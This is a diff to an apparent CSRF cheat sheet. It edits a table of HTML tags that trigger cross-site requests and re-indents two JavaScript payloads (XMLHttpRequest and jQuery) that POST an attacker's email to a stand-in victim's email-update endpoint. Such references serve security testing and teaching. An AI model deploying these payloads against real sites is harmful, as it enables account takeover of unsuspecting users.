@@ -96,7 +96,7 @@
 
 |HTML tags|
 |:--:|
-|```<iframe src="https://vulnerable.tbl/email/update" />```,<br/> ```<script src="https://vulnerable.tbl/email/update" />```,<br/> ```<input type="image" src="https://vulnerable.tbl/email/update" alt="" />```,<br/> ```<embed src="https://vulnerable.tbl/email/update" />```,<br/> ```<audio src="https://vulnerable.tbl/email/update" />```,<br/> ```<video src="https://vulnerable.tbl/email/update" />```,<br/> ```<source src="https://vulnerable.tbl/email/update" />```,<br/> ```<video poster="https://vulnerable.tbl/email/update" />```,<br/> ```<link rel="stylesheet" href="https://vulnerable.tbl/email/update" />```,<br/> ```<object data="https://vulnerable.tbl/email/update" />```,<br/> ```<body background="https://vulnerable.tbl/email/update" />```,<br/> ```<div style="background:url("https://vulnerable.tbl/email/update")" />```,<br/> ```<style>body { background:url("https://vulnerable.tbl/email/update") } </style> />```|
+|```<iframe src="URL" />```,<br/> ```<script src="URL" />```,<br/> ```<input type="image" src="URL" alt="" />```,<br/> ```<embed src="URL" />```,<br/> ```<audio src="URL" />```,<br/> ```<video src="URL" />```,<br/> ```<source src="URL" />```,<br/> ```<video poster="URL" />```,<br/> ```<link rel="stylesheet" href="URL" />```,<br/> ```<object data="URL" />```,<br/> ```<body background="URL" />```,<br/> ```<div style="background:url("URL")" />```,<br/> ```<style>body { background:url("URL") } </style> />```|
 
 ### HTML and JavaScript not requiring user interaction
 
@@ -111,19 +111,19 @@
 
   ```javascript
   <script>
-  const url = "https://vulnerable.tbl/email/update";
-  const params = "email=attacker@attacker.tbl";
-  const CSRF = new XMLHttpRequest();
-  CSRF.open("POST", url, false);
-  CSRF.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-  CSRF.send(params);
+    const url = "https://vulnerable.tbl/email/update";
+    const params = "email=attacker@attacker.tbl";
+    const CSRF = new XMLHttpRequest();
+    CSRF.open("POST", url, false);
+    CSRF.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    CSRF.send(params);
   </script>
   ```
 
   ```javascript
   $.ajax({
-  type: "POST",
-  url: "https://vulnerable.tbl/email/update",
-  data: "email=attacker@attacker.tbl",
+    type: "POST",
+    url: "https://vulnerable.tbl/email/update",
+    data: "email=attacker@attacker.tbl",
   });
   ```
